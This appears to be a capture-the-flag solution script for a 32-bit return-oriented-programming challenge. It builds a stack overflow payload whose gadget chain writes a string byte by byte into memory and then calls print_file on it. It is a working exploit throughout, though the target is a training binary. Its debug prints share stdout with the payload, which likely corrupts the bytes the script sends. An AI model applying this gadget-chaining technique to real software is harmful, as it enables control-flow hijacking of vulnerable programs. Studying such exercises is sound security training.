#!/usr/bin/python
import sys
import struct

# run < <(python challenge.py)
deadcode = b'\xde\xc0\xad\xde'

# Just my one-byte write
payload_locations = [
    b'\x50\xa0\x04\x08',
    b'\x51\xa0\x04\x08', 
    b'\x52\xa0\x04\x08', 
    b'\x53\xa0\x04\x08', 
    b'\x54\xa0\x04\x08', 
    b'\x55\xa0\x04\x08', 
    b'\x56\xa0\x04\x08', 
    b'\x57\xa0\x04\x08', 
    b'\x58\xa0\x04\x08'
]

# 0x080485bb : pop ebp ; ret
pop_ebp_ret = b'\xbb\x85\x04\x08'

def reverse_bytes(addr):
    return addr[::-1]

def write_what_where(data, addr):
    """
    To get an arbitrary write, need a way to control edx and ecx.
    The 0x08048558 gadget lets me control ecx.
    In theory, the 0x08048543 gadget lets me control edx, but looks like a massive pain.
    The 0x08048555 gadget lets me write the low byte of edx into the address at ecx.
    
    Dump of assembler code for function questionableGadgets:
       0x08048543 mov eax,ebp ; mov ebx,0xb0bababa ; pext edx,ebx,eax ; mov eax,0xdeadbeef ; ret
       0x08048555 xchg BYTE PTR [ecx],dl ; ret
       0x08048558 pop ecx ; bswap ecx ; ret

    """
    # the wacky gadget at 0x08048543 takes in ebp, does some black magic bitmasking,
    # and something comes out into edx. not going to try to understand
    # how it all works, just trying to build some input/output values
    wacky_gadget = b'\x43\x85\x04\x08'

    # this one takes an ecx from the stack,
    # but the byte order is reversed.
    pop_ecx_bswap_ecx_ret = b'\x58\x85\x04\x08'

    # load lowest byte of edx into the address at ecx.
    xchg_byte_ptr_ecx_dl_ret = b'\x55\x85\x04\x08'
  
    payload = pop_ebp_ret + \
            data + \
            wacky_gadget + \
            pop_ecx_bswap_ecx_ret + \
            reverse_bytes(addr) + \
            xchg_byte_ptr_ecx_dl_ret

    return payload

def main():
    # 0x080483d0  print_file@plt
    print_file = b'\xd0\x83\x04\x08'
    
    payload = b'A'*40
    payload += b'B'*4                # ebp

    # precomputed by pext.py
    bytes_to_write = [
        b'\x6c\x6c\x6c\x6c',
        b'\xdd\x06\x00\x00',
        b'\x46\x5d\x00\x00',
        b'\x5a\x4b\x00\x00',
        b'\xdb\x05\x00\x00',
        b'\x01\x7f\x7f\x7f',
        b'\x01\xbd\x01\x01',
        b'\x01\x7f\x7f\x7f',
        b'\x00\x00\x00\x00' # null terminator
    ]
   
    for byte, addr in zip(bytes_to_write, payload_locations):
        print(f"Writing {byte} at {addr.hex()}")
        payload += write_what_where(byte, addr)
    
    payload += print_file            # function to exec
    payload += deadcode              # return for print_file
    payload += payload_locations[0]  # argument for print_file
    
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    main()
